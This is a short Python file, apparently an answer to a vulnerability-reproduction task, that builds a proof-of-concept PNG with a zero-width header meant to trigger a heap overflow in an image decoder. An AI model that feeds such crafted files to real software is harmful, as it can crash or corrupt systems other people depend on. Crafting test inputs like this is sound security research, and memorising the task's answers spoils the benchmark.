import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PNG with zero width that triggers heap overflow
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - width=0, height=1
        ihdr_data = struct.pack('>IIBBBBB', 0, 1, 8, 6, 0, 0, 0)
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk))
        ihdr = struct.pack('>I', 13) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk with minimal valid compressed data
        # Filter byte (0) for one row with 0 pixels
        scanline = b'\x00'
        # Compress with zlib
        compressed = zlib.compress(scanline, level=9)
        idat_chunk = b'IDAT' + compressed
        idat_crc = struct.pack('>I', zlib.crc32(idat_chunk))
        idat = struct.pack('>I', len(compressed)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk))
        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Combine all parts
        poc = png_signature + ihdr + idat + iend
        
        return poc